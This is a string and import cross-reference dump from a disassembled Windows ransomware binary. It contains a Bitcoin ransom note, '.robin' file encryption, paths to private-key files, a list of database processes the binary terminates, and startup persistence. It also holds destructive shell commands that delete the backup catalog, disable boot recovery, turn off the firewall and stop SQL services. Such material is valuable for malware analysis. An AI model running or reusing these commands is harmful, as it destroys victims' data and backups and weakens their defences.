reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40ce81	0x517a20	string	0x40c9b0	C:\\Windows\
0x40ced4	0x40ceea	string	0x40c9b0	RQ襷\t blocks=Basic Latin,CJK Unified Ideographs
0x40cfed	0x4f6150	import	0x40c9b0	KERNEL32.dll.lstrcmpW
0x40d018	0x517a08	string	0x40c9b0	C:\Windows
0x40d05f	0x4f612c	import	0x40c9b0	KERNEL32.dll.FindNextFileW
0x40d073	0x4f6138	import	0x40c9b0	KERNEL32.dll.FindClose
0x40d1ae	0x40d20a	string	0x40c9b0	RQ腴\t blocks=Basic Latin,CJK Unified Ideographs
0x40d1c4	0x40d20a	string	0x40c9b0	RQ腴\t blocks=Basic Latin,CJK Unified Ideographs
0x40d3ef	0x4f6124	import	0x40d360	KERNEL32.dll.FindFirstFileW
0x40d400	0x517ab4	string	0x40d360	fuck
0x40d5d3	0x40d5e9	string	0x40d360	RQ覰\t blocks=Basic Latin,CJK Unified Ideographs
0x40d81e	0x517a08	string	0x40d360	C:\Windows
0x40d831	0x517a20	string	0x40d360	C:\\Windows\
0x40d99d	0x4f6150	import	0x40d360	KERNEL32.dll.lstrcmpW
0x40d9c8	0x517a08	string	0x40d360	C:\Windows
0x40da0f	0x4f612c	import	0x40d360	KERNEL32.dll.FindNextFileW
0x40da23	0x4f6138	import	0x40d360	KERNEL32.dll.FindClose
0x40dabc	0x40dad2	string	0x40d360	RQ轫\t blocks=Basic Latin,CJK Unified Ideographs
0x40dbf0	0x40dc06	string	0x40d360	RQ艪\t blocks=Basic Latin,CJK Unified Ideographs
0x40dd9f	0x4f6124	import	0x40dd10	KERNEL32.dll.FindFirstFileW
0x40ddb0	0x517ab4	string	0x40dd10	fuck
0x40dec7	0x40dedd	string	0x40dd10	RQ貧\t blocks=Basic Latin,CJK Unified Ideographs
0x40e109	0x517a08	string	0x40dd10	C:\Windows
0x40e156	0x517a20	string	0x40dd10	C:\\Windows\
0x40e336	0x4f6150	import	0x40dd10	KERNEL32.dll.lstrcmpW
0x40e361	0x517a08	string	0x40dd10	C:\Windows
0x40e3a8	0x4f612c	import	0x40dd10	KERNEL32.dll.FindNextFileW
0x40e3bc	0x4f6138	import	0x40dd10	KERNEL32.dll.FindClose
0x40e4c2	0x40e4d8	string	0x40dd10	QV跡\t blocks=Basic Latin,CJK Unified Ideographs
0x40e5d6	0x40e5ec	string	0x40dd10	RQ裠\t blocks=Basic Latin,CJK Unified Ideographs
0x40e73f	0x4f6124	import	0x40e6b0	KERNEL32.dll.FindFirstFileW
0x40e750	0x517ab4	string	0x40e6b0	fuck
0x40e8cb	0x40e8e1	string	0x40e6b0	RQ讝\t blocks=Basic Latin,CJK Unified Ideographs
0x40e9d7	0x40e9ed	string	0x40e6b0	RQ袜\t blocks=Basic Latin,CJK Unified Ideographs
0x40ead3	0x40eae9	string	0x40e6b0	RQ覛\t blocks=Basic Latin,CJK Unified Ideographs
0x40eb6e	0x517a08	string	0x40e6b0	C:\Windows
0x40eb81	0x517a20	string	0x40e6b0	C:\\Windows\
0x40ebd4	0x40ebea	string	0x40e6b0	RQ襚\t blocks=Basic Latin,CJK Unified Ideographs
0x40ed61	0x4f6150	import	0x40e6b0	KERNEL32.dll.lstrcmpW
0x40ed8c	0x517a08	string	0x40e6b0	C:\Windows
0x40edd3	0x4f612c	import	0x40e6b0	KERNEL32.dll.FindNextFileW
0x40ede7	0x4f6138	import	0x40e6b0	KERNEL32.dll.FindClose
0x40eeed	0x40ef03	string	0x40e6b0	QV茗\t blocks=Basic Latin,CJK Unified Ideographs
0x40f16f	0x4f6124	import	0x40f0e0	KERNEL32.dll.FindFirstFileW
0x40f180	0x517ab4	string	0x40f0e0	fuck
0x40f590	0x517a08	string	0x40f0e0	C:\Windows
0x40f5a3	0x517a20	string	0x40f0e0	C:\\Windows\
0x40f5f6	0x40f60c	string	0x40f0e0	RQ胐\t blocks=Basic Latin,CJK Unified Ideographs
0x40f783	0x4f6150	import	0x40f0e0	KERNEL32.dll.lstrcmpW
0x40f7ae	0x517a08	string	0x40f0e0	C:\Windows
0x40f7f5	0x4f612c	import	0x40f0e0	KERNEL32.dll.FindNextFileW
0x40f809	0x4f6138	import	0x40f0e0	KERNEL32.dll.FindClose
0x40f9d5	0x40f9eb	string	0x40f0e0	RQ褌\t blocks=Basic Latin,CJK Unified Ideographs
0x40fb4d	0x4f6120	import	0x40fb00	KERNEL32.dll.GetLogicalDrives
0x40fc90	0x517b28	string	0x40fc60	sqlserver.exe
0x40fcca	0x517b38	string	0x40fc60	msftesql.exe
0x40fcfb	0x517b48	string	0x40fc60	sqlagent.exe
0x40fd2c	0x517b58	string	0x40fc60	sqlbrowser.exe
0x40fd5d	0x517b68	string	0x40fc60	sqlwriter.exe
0x40fd85	0x517b78	string	0x40fc60	mysqld.exe
0x40fdaa	0x517b84	string	0x40fc60	mysqld-nt.exe
0x40fdcf	0x517b94	string	0x40fc60	mysqld-opt.exe
0x40fe0c	0x4f6148	import	0x40fc60	KERNEL32.dll.CloseHandle
0x40fe24	0x4f6140	import	0x40fc60	KERNEL32.dll.CreateToolhelp32Snapshot
0x40fe3e	0x4f6128	import	0x40fc60	KERNEL32.dll.Process32First
0x40fe8a	0x4f613c	import	0x40fc60	KERNEL32.dll.OpenProcess
0x40fe99	0x4f6130	import	0x40fc60	KERNEL32.dll.TerminateProcess
0x40fea0	0x4f6148	import	0x40fc60	KERNEL32.dll.CloseHandle
0x40feaa	0x4f6148	import	0x40fc60	KERNEL32.dll.CloseHandle
0x40feb8	0x4f6144	import	0x40fc60	KERNEL32.dll.Process32Next
0x40ff96	0x4f6124	import	0x40ff10	KERNEL32.dll.FindFirstFileW
0x4100d3	0x4100e9	string	0x40ff10	RQ覅\t blocks=Basic Latin,CJK Unified Ideographs
0x4101ca	0x4f6150	import	0x40ff10	KERNEL32.dll.lstrcmpW
0x4101fc	0x517ba8	string	0x40ff10	\Read-it.txt
0x4103d7	0x4f612c	import	0x40ff10	KERNEL32.dll.FindNextFileW
0x4103f1	0x4f6138	import	0x40ff10	KERNEL32.dll.FindClose
0x4104f4	0x41050a	string	0x40ff10	QV腁\t blocks=Basic Latin,CJK Unified Ideographs
0x4105c2	0x4105d8	string	0x40ff10	RQ跀\t blocks=Basic Latin,CJK Unified Ideographs
0x41076a	0x517bf0	string	0x410730	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x410929	0x517c4c	string	0x410860	C:\ProgramData\IDk.txt
0x41096d	0x517c64	string	0x410860	C:\ProgramData\pkey.txt
0x410b46	0x517c64	string	0x410860	C:\ProgramData\pkey.txt
0x410cb3	0x517c4c	string	0x410860	C:\ProgramData\IDk.txt
0x410db9	0x517d34	string	0x410860	C:\ProgramData
0x410e4d	0x517d34	string	0x410860	C:\ProgramData
0x410edf	0x517bc8	string	0x410860	0123456789
0x411014	0x517bd4	string	0x410860	QWERTYUIOPASDFGHJKLZXCVBNM
0x411390	0x517c4c	string	0x410860	C:\ProgramData\IDk.txt
0x4117bd	0x517c64	string	0x410860	C:\ProgramData\pkey.txt
0x4117ec	0x5178a4	string	0x410860	OutputFileName
0x41180e	0x5178c8	string	0x410860	OutputBinaryMode
0x4118b6	0x517d48	string	0x410860	95DE4925807931C8D34E1D9460A2DE
0x4118e0	0x517d68	string	0x410860	4D2E0F75F1B2499AC0A49EED96F81C9F301AFBE0741530B13E9F0630212DB2DC766CD2D213E1DDE0A7EF8E74182EC3C98ACE5FB67D70AE03053412B2A2E9D09107A0DEFE6748B3100EB8BD2117D6D91AA3A4FC6C98884600F513241A57002F5B2B500831BE3C82967B5AA5652B0B87BCB65963064D61E236FF1B30F3351C9E08759E34BB66A3A81256502169950DF22EB80496AA8E3A3AB84B1D05B0EB4D57F5B16AD80383ECB6B694CBE8843711C87AD13D8DE410F584B9E84139B806C9D968437690B9AD54E41BC2FF71E49180479A77D1CA61456D8E94867BA6C50D3118BBDD4D43E45305276B9F598137EC4188796F75C22578C2F3D4B268C84FC592C28855834D5444AB39CA6F5887C9D731643056E60B008591B37DE5474836A3AD65DE730B8E978B38DD0455007FBCC49969BE20D65B8FE0844EC7294B794B8C269E19A55F024D903D2E25929C66F3AEA56C9BE5D328BF2491027A634F68252D52F57813780B5C5CC89E9222318CC528DDAC9BDF5A95032CD047D6C33726A25DA44955C70D8B3B4EF78A3712A8AA8C1C9139AC703DA00ED2EB99C445836DF610D831D3591447FA252D7AF179CB1002A77BBFEB60F129275873F2EC54C372DF2CF829139DE208884B9DAEE8
0x411af5	0x5180fc	string	0x410860	https://api.my-ip.io/ip
0x411bbc	0x518114	string	0x410860	%d-%m-%Y %H:%M:%S
0x411c29	0x518128	string	0x410860	C:\ProgramData\prvkey.txt
0x411d1f	0x518168	string	0x410860	\n\nID=
0x411d41	0x51815c	string	0x410860	Disksize=
0x411e39	0x518154	string	0x410860	Mail=
0x411ef8	0x51814c	string	0x410860	Ip=
0x411fb4	0x518144	string	0x410860	Date:
0x412512	0x518128	string	0x410860	C:\ProgramData\prvkey.txt
0x412555	0x518170	string	0x410860	C:\ProgramData\prvkey.txt.key
0x4129c4	0x517a50	string	0x410860	
0x412d29	0x4f6134	import	0x410860	KERNEL32.dll.GetDriveTypeA
0x412e84	0x5181c8	string	0x410860	fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
0x4136ba	0x4f614c	import	0x413580	KERNEL32.dll.FreeConsole
0x41375a	0x517d48	string	0x413580	95DE4925807931C8D34E1D9460A2DE
0x41377b	0x5182c8	string	0x413580	49496A8C58F01421C2009BE02032D6D5411DBB309A0C6DD1DA6EDC17C1963F9E9A664D1EB6FC038DA702A75A1BAFBC6DD6AAAF93FD58E3E1632D8213E5D17F599095998507F6CC467399486990DEF4842488D56DF894D425
0x413794	0x518380	string	0x413580	8BE854A55774002101A68818F02D631DBBA28B27FF36CFDB6405BA79D6B228552E931B233BAAC1561F8F5DB8CDCC5A1AD104A4CE2FAF4FE338ED7C90392FDBD999096F8FD26D222286D8D36309055AE5BA9914F6EAF0D5C8
0x413ab6	0x518434	string	0x413580	.robin
0x413b52	0x51843c	string	0x413580	net stop MSDTC
0x413b5c	0x51844c	string	0x413580	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x413b66	0x518488	string	0x413580	bcdedit /set {default} recoveryenabled no
0x413b70	0x5184b4	string	0x413580	wbadmin delete catalog -quiet
0x413b7a	0x5184d4	string	0x413580	net stop SQLSERVERAGENT
0x413b84	0x5184ec	string	0x413580	net stop MSSQLSERVER
0x413b8e	0x518504	string	0x413580	net stop vds
0x413b98	0x518514	string	0x413580	netsh advfirewall set currentprofile state off
0x413ba2	0x518544	string	0x413580	netsh firewall set opmode mode=disable
0x413bac	0x51856c	string	0x413580	net stop SQLWriter
0x413bb6	0x518580	string	0x413580	net stop SQLBrowser
0x413bc0	0x5184ec	string	0x413580	net stop MSSQLSERVER
0x413bca	0x518594	string	0x413580	net stop MSSQL$CONTOSO1
0x413c36	0x4f6134	import	0x413580	KERNEL32.dll.GetDriveTypeA
0x413ddb	0x4a8990	string	0x413580	WVS3
0x413de9	0x4a8990	string	0x413580	WVS3
0x413f7b	0x5185e0	string	0x413580	All Your Files Has Been Encrypted\n\nYou Have to Pay to Get Your Files Back\n\n1-Go to C:\ProgramData\ or in Your other Drives and send us prvkey.txt.key file \n\n2-You can send some file little than 1mb for Decryption test to trust us But the test File should not contain valuable data\n\n3-Payment should be with Bitcoin\n\n\n4-Changing Windows without saving prvkey.txt.key file will cause permanete Data loss\n\n\nOur Email:
0x413fae	0x5185ac	string	0x413580	\n\nin Case of no Answer:
0x4141c4	0x4f6134	import	0x413580	KERNEL32.dll.GetDriveTypeA
0x4145c5	0x518928	string	0x413580	\Read-this.txt
0x4148ee	0x517a88	string	0x413580	Unhandled exception caught
0x41493d	0x4f6134	import	0x413580	KERNEL32.dll.GetDriveTypeA
0x414b8c	0x517a88	string	0x413580	Unhandled exception caught
0x415015	0x5179dc	string	0x413580	space
0x4150a0	0x51826c	string	0x413580	Unhandled exception\n
0x415677	0x415682	string	0x415600	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x415f88	0x415f99	string	0x415f40	3ɉO` blocks=Basic Latin,Latin Extended-B
0x415f8e	0x415f99	string	0x415f40	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41604b	0x517858	string	0x416040	SHA-1
0x4161d7	0x518950	string	0x4161a0	OutputStringPointer
0x416e97	0x416ea9	string	0x416de0	3ۋE\b blocks=Basic Latin,Arabic
0x417513	0x417517	string	0x4174f0	WPRQ
0x4179a5	0x4cba9a	string	0x417910	j\fh(
0x417c4f	0x4c98ec	string	0x417bf0	j\fhȿR blocks=Basic Latin,Latin Extended-B
0x418042	0x418077	string	0x417f60	;O\fs
0x4197d4	0x4197df	string	0x419780	3ɉN` blocks=Basic Latin,Latin Extended-B
0x41a3ba	0x41a3cb	string	0x41a390	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41a3c0	0x41a3cb	string	0x41a390	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41b0c3	0x5189f4	string	0x41b090	BufferedTransformation: this object doesn't allow input
0x41b223	0x5189f4	string	0x41b1f0	BufferedTransformation: this object doesn't allow input
0x41c7f0	0x518a2c	string	0x41c7f0	vector<T> too long
0x41d40d	0x517994	string	0x41d3c0	MGF1
0x41d492	0x517858	string	0x41d3c0	SHA-1
0x41d6b0	0x518a98	string	0x41d6b0	invalid string position
0x41de38	0x5181b4	string	0x41ddd0	prvkey.txt.key
0x41e48b	0x517860	string	0x41e450	FeedbackSize
0x41ef21	0x517b0c	string	0x41edb0	shit
0x4201ee	0x420202	string	0x4200d0	QW荄\b blocks=Basic Latin,CJK Unified Ideographs
0x4211d0	0x518ab0	string	0x4211d0	string too long
0x421907	0x51754c	string	0x421800	false
0x421920	0x517554	string	0x421800	true
0x42267c	0x518284	string	0x422670	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
0x4234c1	0x423490	string	0x423450	;}\ftAf
0x4234d4	0x423490	string	0x423450	;}\ftAf
0x423a33	0x4f64c0	string	0x423a10	easy handle already used in multi handle
0x4254d7	0x4f64f0	string	0x423ce0	SESS
0x425517	0x4f64f8	string	0x423ce0	FLUSH
0x425541	0x4f6500	string	0x423ce0	RELOAD
0x4255af	0x4f6508	string	0x423ce0	Set-Cookie:
0x425c94	0x425ca9	string	0x423ce0	9Xht#
0x425cac	0x425cd1	string	0x423ce0	9Xlt
0x427251	0x4a8990	string	0x427210	WVS3
0x4273c9	0x4f66f0	string	0x427210	Internal error removing splay node = %d\n
0x427463	0x4f671c	string	0x427420	Internal error clearing splay node = %d\n
0x42752c	0x427561	string	0x4274f0	][^_Y
0x427660	0x4f63b8	import	0x427570	WS2_32.dll.closesocket
0x427abf	0x4f6348	import	0x427710	WS2_32.dll.recv
0x427b66	0x427887	string	0x427710	]_^[
0x4280ed	0x4f63b8	import	0x428020	WS2_32.dll.closesocket
0x429f0a	0x429f79	string	0x429ea0	3\t\a3
0x429f14	0x429f79	string	0x429ea0	3\t\a3
0x429f41	0x429f79	string	0x429ea0	3\t\a3
0x42a0aa	0x42a0a0	string	0x429fb0	;(t\rA
0x42a41f	0x42aad9	string	0x42a380	j\nhLhO
0x42a49a	0x4f6778	string	0x42a380	%4095[^;\r\n=] =%4095[^;\r\n]
0x42a5ba	0x4f67c8	string	0x42a380	__Secure-
0x42a5d8	0x4f67d4	string	0x42a380	__Host-
0x42a631	0x4f67dc	string	0x42a380	secure
0x42a667	0x4f67e4	string	0x42a380	httponly
0x42a691	0x4f67f0	string	0x42a380	path
0x42a6de	0x4f67f8	string	0x42a380	domain
0x42a708	0x4f676c	string	0x42a380	localhost
0x42a7e9	0x4f6804	string	0x42a380	skipped cookie with bad tailmatch domain: %s\n
0x42a83b	0x4f6834	string	0x42a380	version
0x42a866	0x4f683c	string	0x42a380	max-age
0x42a891	0x4f6844	string	0x42a380	expires
0x42a937	0x446830	string	0x42a380	QSUVW
0x42a95e	0x4f6794	string	0x42a380	oversized cookie dropped, name/val %zu + %zu bytes\n
0x42b326	0x42b621	string	0x42b300	_^]3
0x42b332	0x42b621	string	0x42b300	_^]3
0x42b6e0	0x42b731	string	0x42b6b0	_^]3
0x42b6e4	0x4f68b8	string	0x42b6b0	none
0x42b722	0x42b731	string	0x42b6b0	_^]3
0x42b726	0x42b731	string	0x42b6b0	_^]3
0x42b7f3	0x4f6508	string	0x42b6b0	Set-Cookie:
0x42b855	0x42b7f0	string	0x42b6b0	j\vVh\beO
0x42b90d	0x4f68b8	string	0x42b8a0	none
0x42b964	0x4f6748	string	0x42b8a0	ignoring failed cookie_init for %s\n
0x42b985	0x42b9e1	string	0x42b8a0	3ۋ|$ blocks=Basic Latin,Arabic
0x42b9cd	0x42b9e1	string	0x42b8a0	3ۋ|$ blocks=Basic Latin,Arabic
0x42ba2b	0x4f6508	string	0x42b8a0	Set-Cookie:
0x42bb4e	0x4f69a0	string	0x42bb00	WARNING: failed to save cookies in %s\n
0x42bcb3	0x4f68e4	string	0x42bbe0	%s.%s.tmp
0x42bcfd	0x4f68f8	string	0x42bbe0	# Netscape HTTP Cookie File\n# https://curl.haxx.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\n
0x42bdec	0x4f6984	string	0x42bbe0	#\n# Fatal libcurl error\n
0x42c0af	0x517658	string	0x42c0a0	unknown
0x42c0f4	0x4f6864	string	0x42c0a0	FALSE
0x42c0fd	0x4f685c	string	0x42c0a0	TRUE
0x42c117	0x4f684c	string	0x42c0a0	#HttpOnly_
0x42c12c	0x4f68c8	string	0x42c0a0	%s%s%s\t%s\t%s\t%s\t%I64d\t%s\t%s
0x42c462	0x4f615c	import	0x42c340	KERNEL32.dll.InitializeCriticalSectionEx
0x42c4ae	0x4f69f8	string	0x42c340	getaddrinfo() thread failed to start\n
0x42c694	0x4f6154	import	0x42c660	KERNEL32.dll.EnterCriticalSection
0x42c6a0	0x4f6158	import	0x42c660	KERNEL32.dll.LeaveCriticalSection
0x42c8bc	0x4f6154	import	0x42c8a0	KERNEL32.dll.EnterCriticalSection
0x42c8cf	0x4f6158	import	0x42c8a0	KERNEL32.dll.LeaveCriticalSection
0x42c91c	0x4f63b8	import	0x42c8a0	WS2_32.dll.closesocket
0x42c94c	0x4f6160	import	0x42c940	KERNEL32.dll.DeleteCriticalSection
0x42c982	0x4f63b8	import	0x42c940	WS2_32.dll.closesocket
0x42ca88	0x4f69cc	string	0x42ca80	proxy
0x42ca8d	0x4f69d4	string	0x42ca80	host
0x42caa9	0x4f69dc	string	0x42ca80	Could not resolve %s: %s
0x42d28a	0x42d2d5	string	0x42d280	_^]3
0x42d376	0x4f6d0c	string	0x42d330	Content-Type
0x42d3b2	0x4f6d74	string	0x42d330	multipart/mixed
0x42d3de	0x4f6d84	string	0x42d330	application/octet-stream
0x42d40c	0x4f6cb0	string	0x42d330	text/plain
0x42d42b	0x4f6da0	string	0x42d330	Content-Disposition
0x42d468	0x4f6db4	string	0x42d330	multipart/
0x42d47e	0x4f6dc0	string	0x42d330	attachment
0x42d487	0x4f6dc0	string	0x42d330	attachment
0x42d497	0x42d4a7	string	0x42d330	9|$$
0x42d49c	0x42d4a7	string	0x42d330	9|$$
0x42d51a	0x4f6dd0	string	0x42d330	; filename="
0x42d52f	0x4f6de0	string	0x42d330	; name="
0x42d53f	0x4f6dec	string	0x42d330	Content-Disposition: %s%s%s%s%s%s%s
0x42d582	0x4f6d50	string	0x42d330	; boundary=
0x42d58c	0x4f6d5c	string	0x42d330	Content-Type: %s%s%s
0x42d5ab	0x4f6e10	string	0x42d330	Content-Transfer-Encoding
0x42d5cc	0x42d5e4	string	0x42d330	Ph,nO
0x42d5df	0x4f6c20	string	0x42d330	8bit
0x42d5e5	0x4f6e2c	string	0x42d330	Content-Transfer-Encoding: %s
0x42d628	0x4f6e4c	string	0x42d330	multipart/form-data
0x42d63d	0x4f6e60	string	0x42d330	form-data
0x42d73a	0x4f6d30	string	0x42d6d0	Can't add itself as a subpart!
0x42d829	0x4f6d0c	string	0x42d790	Content-Type
0x42dd49	0x4f6e70	string	0x42dd30	----------------%ld%s
0x42de6b	0x4f6d30	string	0x42de00	Can't add itself as a subpart!
0x42e325	0x4f6d28	string	0x42e240	--\r\n
0x42e592	0x4f6d0c	string	0x42e4b0	Content-Type
0x42e5c5	0x42e590	string	0x42e4b0	j\fh\fmO
0x42e825	0x42e845	string	0x42e7c0	j\fh\fmO
0x42e847	0x4f6d0c	string	0x42e7c0	Content-Type
0x42f550	0x4f6e88	string	0x42f4d0	Connection cache is full, closing the oldest one.\n
0x42f70d	0x42f704	string	0x42f6f0	90t\f
0x42fabd	0x42fc09	string	0x42fa70	_^]2
0x42fd08	0x4f6fd8	string	0x42fcc0	sha256//
0x42fd18	0x42fec5	string	0x42fcc0	h\bmO
0x42fd56	0x43012a	string	0x42fcc0	_][^
0x42fd91	0x4f6fe4	string	0x42fcc0	\t public key hash: sha256//%s\n
0x42fdf0	0x4f7004	string	0x42fcc0	;sha256//
0x42fe77	0x4f6fd8	string	0x42fcc0	sha256//
0x42fff5	0x4f6fa0	string	0x42fcc0	-----BEGIN PUBLIC KEY-----
0x430022	0x4f6fbc	string	0x42fcc0	\n-----END PUBLIC KEY-----
0x43034c	0x430379	string	0x430140	_^]3
0x43067b	0x4f6f64	string	0x430630	CURL_SSLVERSION_MAX incompatible with CURL_SSLVERSION
0x4306cf	0x4f6f28	string	0x430630	Unrecognized parameter value passed via CURLOPT_SSLVERSION
